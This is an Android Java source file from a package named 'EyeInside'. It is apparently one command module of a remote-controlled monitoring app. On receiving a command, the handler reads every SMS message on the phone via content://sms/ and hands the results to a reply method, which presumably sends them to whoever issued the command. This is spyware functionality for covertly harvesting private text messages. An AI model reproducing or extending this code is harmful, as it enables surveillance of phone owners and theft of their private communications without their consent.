package com.code4bones.EyeInside;

import com.code4bones.utils.NetLog;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;


final class handleSmsLog extends Handler {

	private Context mContext;
	
	public handleSmsLog(Context context) {
		mContext = context;
	}
	
	public static final Uri URI = Uri.parse("content://sms/");    

	public void handleMessage(Message msg) {
	   CommandObj cmd = (CommandObj) msg.obj;
	   Cursor cur = mContext.getContentResolver().query(URI, null,null, null, "_id DESC");
       if  (cur == null || !cur.moveToFirst() ) {
       		NetLog.e("SMS Cursor null");
    	   return;
       }
       
		
		try {
				cmd.Reply(cur);
				cur.close();
			} catch (Exception e) {
				NetLog.v("handleSmsLog error: %s",e.getMessage());
				//cmd.replySMS("E: %s -> %s", cmd.commandName,e.getMessage());
		}
	} // handleMessage
}
